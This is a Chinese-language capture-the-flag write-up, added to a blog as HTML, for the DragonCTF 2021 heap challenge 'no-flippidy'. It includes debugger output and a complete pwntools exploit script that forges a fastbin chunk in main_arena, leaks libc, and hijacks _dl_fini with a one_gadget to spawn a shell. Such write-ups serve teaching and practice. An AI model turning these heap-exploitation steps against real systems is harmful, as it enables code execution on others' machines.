@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="no-flippidy程序分析首先发现是libc_2.27_2.4的libc，这样tcache double free就没有了，因此之前flippidy的洞也就不能用了。然后到这里，我也就没什么思路了。 参考了superguesser的wp，学到了新的方法。链接https:&#x2F;&#x2F;kileak.github.io&#x2F;ctf&#x2F;2021&#x2F;dragoncf21-noflippidy&#x2F; 知识点heap的mmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Drangonctf2021-noflippidy">
+<meta property="og:url" content="http://example.com/2022/01/22/Drangonctf2021-noflippidy/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="no-flippidy程序分析首先发现是libc_2.27_2.4的libc，这样tcache double free就没有了，因此之前flippidy的洞也就不能用了。然后到这里，我也就没什么思路了。 参考了superguesser的wp，学到了新的方法。链接https:&#x2F;&#x2F;kileak.github.io&#x2F;ctf&#x2F;2021&#x2F;dragoncf21-noflippidy&#x2F; 知识点heap的mmap">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-22T03:36:23.000Z">
+<meta property="article:modified_time" content="2022-01-22T03:42:14.353Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Drangonctf2021-noflippidy</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/01/21/dicectf2021-flippidy/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/01/22/Drangonctf2021-noflippidy/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&text=Drangonctf2021-noflippidy"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&is_video=false&description=Drangonctf2021-noflippidy"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Drangonctf2021-noflippidy&body=Check out this article: http://example.com/2022/01/22/Drangonctf2021-noflippidy/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&title=Drangonctf2021-noflippidy"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&name=Drangonctf2021-noflippidy&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/01/22/Drangonctf2021-noflippidy/&t=Drangonctf2021-noflippidy"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#no-flippidy"><span class="toc-number">1.</span> <span class="toc-text">no-flippidy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#heap%E7%9A%84mmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">heap的mmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dl-fini%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">dl_fini利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">1.3.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%89%B9%E6%AE%8A%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">遇到的一个特殊点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%96%91%E6%83%91"><span class="toc-number">1.5.</span> <span class="toc-text">疑惑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Drangonctf2021-noflippidy
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">nich0las</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-22T03:36:23.000Z" itemprop="datePublished">2022-01-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/heap/" rel="tag">heap</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="no-flippidy"><a href="#no-flippidy" class="headerlink" title="no-flippidy"></a>no-flippidy</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先发现是libc_2.27_2.4的libc，这样tcache double free就没有了，因此之前flippidy的洞也就不能用了。然后到这里，我也就没什么思路了。</p>
+<p>参考了superguesser的wp，学到了新的方法。链接<a target="_blank" rel="noopener" href="https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/">https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/</a></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="heap的mmap"><a href="#heap的mmap" class="headerlink" title="heap的mmap"></a>heap的mmap</h3><p>我们只能做极少的事情，在这里只能add堆块，算是很严苛了。superGuesser给出了一个新的glibc特性：当分配一个很大的堆块时，会直接mmap一块虚拟地址空间出来，而这一块<strong>和libc有固定偏移</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x3fe000           0x400000 rw-p     2000 0      /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x400000           0x401000 r--p     1000 2000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x401000           0x402000 r-xp     1000 3000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x402000           0x403000 r--p     1000 4000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x403000           0x404000 r--p     1000 4000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x404000           0x405000 rw-p     1000 5000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">         0x13ed000          0x140e000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7efe4ff80000     0x7efe50181000 rw-p   201000 0      anon_7efe4ff80  &lt;==== our mmaped heap</span><br><span class="line">    0x7efe50181000     0x7efe50368000 r-xp   1e7000 0      /home/nicholas/glibc-all-in-one/libs/libc6_2.27-3ubuntu1.4_amd64/libc.so.6</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们分配notes，其实就是在libc中做修改。我们只要尝试分配到free_hook就可以了。</p>
+<h3 id="dl-fini利用"><a href="#dl-fini利用" class="headerlink" title="dl_fini利用"></a>dl_fini利用</h3><p>这个是以前听说过的一种利用，最早在pwnable上面看到过。现在难得见到了可以学习的题目。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;  </span><br><span class="line">          ...</span><br><span class="line">          </span><br><span class="line">          _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">                         <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">          </span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line">              <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;                      </span><br><span class="line">                      <span class="comment">/* First see whether an array is given. */</span></span><br><span class="line">                      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                          ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                          </span><br><span class="line">                          <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                            / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                            ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">/* Next try the old-style destructor. */</span></span><br><span class="line">                      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                        DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line">            ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一般是两种利用方法</p>
+<ol>
+<li>改写<code>(fini_t) array[i]</code>，这样后面就会调用这个函数</li>
+<li>改写<code>DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr)</code>往里面存地址，这样也会调用函数</li>
+</ol>
+<p>可以这道题没有给出使用fini的做法。</p>
+<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p &amp;__free_hook</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = (void (**)(void *, const void *)) 0x7f49a29db8e8 &lt;__free_hook&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p 0x7f49a29db8e8-0x7f49a23ed000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = 6220008</span></span><br></pre></td></tr></table></figure>
+
+<p>之后计算(6220008/0x40)得到我们想要覆盖到free_hook的偏移。但是事先要泄露一个堆地址或者libc地址。superguesser尝试了这么做，但是发现能够泄露，泄露之后无法再次调用。</p>
+<p>这里采用了一种伪造堆块的方法。如下图</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(<span class="number">0x404000</span>)            &lt;= points above menu_ptrs</span><br><span class="line"></span><br><span class="line">add((<span class="number">0x5ecc60</span>-<span class="number">0x10</span>)/<span class="number">8</span>, payload)     &lt;= offset to <span class="number">0x40</span> fastbin main_arena</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x7f49a29d9c60-0x20</span></span><br><span class="line">0x7f49a29d9c40 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f49a29d9c50 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000  </span><br><span class="line">0x7f49a29d9c60 &lt;main_arena+32&gt;: 0x0000000000000000      0x0000000000000000   &lt;=== 这里是0x40,0x50的fastbin头位置</span><br><span class="line">0x7f49a29d9c70 &lt;main_arena+48&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>这里尝试在main arena中0x40的位置伪造一个堆块，这样下次取出0x40堆块时，就可以实现一次任意地址写。这样，我们就可以和flippidy一样，写menu，然后打印出一个libc地址！</p>
+<p>接下来，就是写malloc_hook或者dl_fini都可以了。这里练习用dl_fini</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./no_flippidy&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./no_flippidy&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_add</span>():</span></span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x4012D0&quot;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_menu</span>():</span></span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x401729&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;will be:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x300200020</span>/<span class="number">8</span>)) <span class="comment"># get a mmaped chunk before libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk in main_arena</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(<span class="number">0x404000</span>) +p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># above menu ptrs, 0x404010 is also ok</span></span><br><span class="line">add(<span class="number">0x5ecc50</span>/<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rewrite blocks, get libc_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line"><span class="comment"># for practise, write dl_fini&#x27;s exit hook</span></span><br><span class="line"><span class="comment"># debug_menu()</span></span><br><span class="line">my_og = libc_addr + og[<span class="number">1</span>]</span><br><span class="line">success(<span class="string">&quot;og: &quot;</span> + <span class="built_in">hex</span>(my_og))</span><br><span class="line">payload2 = <span class="string">b&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(my_og)</span><br><span class="line">add((<span class="number">0x81c000</span> + <span class="number">0x1208</span>) / <span class="number">8</span>,payload2) <span class="comment"># question: how to find this addr?</span></span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">solve.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.sendline(str(3))</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b&#x27;3\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x9 bytes:</span><br><span class="line">    b&#x27;Goodbye!\n&#x27;</span><br><span class="line">Goodbye!</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    b&#x27;libc.so.6  no_flippidy\tsolve.py\n&#x27;</span><br><span class="line">libc.so.6  no_flippidy    solve.py</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span> </span><br></pre></td></tr></table></figure>
+
+<h2 id="遇到的一个特殊点"><a href="#遇到的一个特殊点" class="headerlink" title="遇到的一个特殊点"></a>遇到的一个特殊点</h2><p>这里一开始没注意到一个小问题: 我们伪造的是fastbin chunk，但是他<strong>会检查size</strong>，我们没有伪造size，为什么能过？这是因为有<strong>tcache stashing unlink</strong>机制：在tcache为空的时候，如果这个tcache的槽大小对应的fastbin中有多余的块，会把fastbin中的块全部拿到tcache中（直到填满）因此很巧妙的避开了检查。</p>
+<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>该怎么寻找dl_fini地址呢？</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了新的glibc利用：当可控chunk大小时，分配如上较大快，可以直接相当于劫持glibc和dl。其中dl还可以采用上面的劫持dl_fini的方法一键getshell。注意这里因为分配的时每一个堆块的储存地址的地方，所以还不能直接写exithook和mallochook等，要找到储存exithook和mallochook的地址才行。因此这里采用的是劫持dl_fini中的l-&gt;l_info[DT_FINI]。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#no-flippidy"><span class="toc-number">1.</span> <span class="toc-text">no-flippidy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#heap%E7%9A%84mmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">heap的mmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dl-fini%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">dl_fini利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">1.3.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%89%B9%E6%AE%8A%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">遇到的一个特殊点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%96%91%E6%83%91"><span class="toc-number">1.5.</span> <span class="toc-text">疑惑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/01/22/Drangonctf2021-noflippidy/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
